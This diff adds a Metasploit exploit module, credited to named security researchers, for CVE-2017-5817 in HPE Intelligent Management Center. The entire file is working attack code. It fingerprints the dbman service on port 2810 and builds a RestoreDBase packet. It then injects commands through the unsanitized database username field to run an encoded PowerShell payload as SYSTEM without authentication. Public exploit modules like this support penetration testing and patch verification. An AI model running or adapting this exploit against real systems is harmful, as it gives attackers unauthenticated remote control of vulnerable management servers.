@@ -1,0 +1,207 @@
+##
+# This module requires Metasploit: https://metasploit.com/download
+# Current source: https://github.com/rapid7/metasploit-framework
+##
+
+class MetasploitModule < Msf::Exploit::Remote
+  Rank = ExcellentRanking
+
+  include Msf::Exploit::Remote::Tcp
+  include Msf::Exploit::Powershell
+
+  def initialize(info = {})
+    super(update_info(info,
+      'Name'           => 'HPE iMC dbman RestoreDBase Unauthenticated RCE',
+      'Description'    => %q{
+        This module exploits a remote command execution vulnerablity in
+        Hewlett Packard Enterprise Intelligent Management Center before
+        version 7.3 E0504P04.
+
+        The dbman service allows unauthenticated remote users to restore
+        a user-specified database (OpCode 10007), however the database
+        connection username is not sanitized resulting in command injection,
+        allowing execution of arbitrary operating system commands as SYSTEM.
+        This service listens on TCP port 2810 by default.
+
+        This module has been tested successfully on iMC PLAT v7.2 (E0403)
+        on Windows 7 SP1 (EN).
+      },
+      'License'        => MSF_LICENSE,
+      'Author'         =>
+        [
+          'sztivi', # Discovery
+          'Chris Lyne', # Python PoC (@lynerc)
+          'Brendan Coles <bcoles[at]gmail.com>' # Metasploit
+        ],
+      'References'     =>
+        [
+          ['CVE', '2017-5817'],
+          ['EDB', '43195'],
+          ['ZDI', '17-341'],
+          ['URL', 'https://www.securityfocus.com/bid/98469/info'],
+          ['URL', 'https://h20564.www2.hpe.com/hpsc/doc/public/display?docId=emr_na-hpesbhf03745en_us']
+        ],
+      'Platform'       => 'win',
+      'Targets'        => [['Automatic', {}]],
+      'Payload'        => { 'BadChars' => "\x00" },
+      'DefaultOptions' => { 'WfsDelay' => 15 },
+      'Privileged'     => true,
+      'DisclosureDate' => 'May 15 2017',
+      'DefaultTarget'  => 0))
+    register_options [Opt::RPORT(2810)]
+  end
+
+  def check
+    # empty RestoreDBase packet
+    pkt = [10007].pack('N')
+
+    connect
+    sock.put pkt
+    res = sock.get_once
+    disconnect
+
+    # Expected reply:
+    # "\x00\x00\x00\x01\x00\x00\x00:08\x02\x01\xFF\x043Dbman deal msg error, please to see dbman_debug.log"
+    return CheckCode::Detected if res =~ /dbman/i
+
+    CheckCode::Safe
+  end
+
+  def dbman_msg(database_user)
+    data = ''
+
+    db_ip = "#{rand(255)}.#{rand(255)}.#{rand(255)}.#{rand(255)}"
+    database_type = "\x03" # MySQL
+    restore_type = 'MANUAL'
+    database_password = rand_text_alpha rand(1..5)
+    database_port = rand_text_alpha rand(1..5)
+    database_instance = rand_text_alpha rand(1..5)
+    junk = rand_text_alpha rand(1..5)
+
+    # database ip
+    data << "\x04"
+    data << [db_ip.length].pack('C')
+    data << db_ip
+
+    # ???
+    data << "\x04"
+    data << [junk.length].pack('C')
+    data << junk
+
+    # ???
+    data << "\x04"
+    data << [junk.length].pack('C')
+    data << junk
+
+    # junk
+    data << "\x04"
+    data << [junk.length].pack('C')
+    data << junk
+
+    # ???
+    data << "\x02\x01\x01"
+
+    # database type
+    data << "\x02"
+    data << [database_type.length].pack('C')
+    data << database_type
+
+    # restore type
+    data << "\x04"
+    data << [restore_type.length].pack('C')
+    data << restore_type
+
+    # ???
+    data << "\x04"
+    data << [junk.length].pack('C')
+    data << junk
+
+    # database user
+    data << "\x04"
+    data << "\x82"
+    data << [database_user.length].pack('n')
+    data << database_user
+
+    # database password
+    data << "\x04"
+    data << [database_password.length].pack('C')
+    data << database_password
+
+    # database port
+    data << "\x04"
+    data << [database_port.length].pack('C')
+    data << database_port
+
+    # database instance
+    data << "\x04"
+    data << [database_instance.length].pack('C')
+    data << database_instance
+
+    # ???
+    data << "\x04"
+    data << [junk.length].pack('C')
+    data << junk
+
+    # ???
+    data << "\x04"
+    data << [junk.length].pack('C')
+    data << junk
+
+    # ???
+    data << "\x04"
+    data << [junk.length].pack('C')
+    data << junk
+
+    # ???
+    data << "\x04"
+    data << [junk.length].pack('C')
+    data << junk
+
+    # ???
+    data << "\x30\x00"
+    data << "\x02\x01\x01"
+
+    data
+  end
+
+  def dbman_restoredbase_pkt(database_user)
+    data = dbman_msg database_user
+
+    # opcode 10007 (RestoreDBase)
+    pkt = [10007].pack('N')
+
+    # packet length
+    pkt << "\x00\x00"
+    pkt << [data.length + 4].pack('n')
+
+    # packet data length
+    pkt << "\x30\x82"
+    pkt << [data.length].pack('n')
+
+    # packet data
+    pkt << data
+
+    pkt
+  end
+
+  def execute_command(cmd, _opts = {})
+    connect
+    sock.put dbman_restoredbase_pkt "\"& #{cmd} &"
+    disconnect
+  end
+
+  def exploit
+    command = cmd_psh_payload(
+      payload.encoded,
+      payload_instance.arch.first,
+      { :remove_comspec => true, :encode_final_payload => true }
+    )
+
+    if command.length > 8000
+      fail_with Failure::BadConfig, "#{peer} - The selected payload is too long to execute through Powershell in one command"
+    end
+
+    print_status "Sending payload (#{command.length} bytes)..."
+    execute_command command
+  end
+end
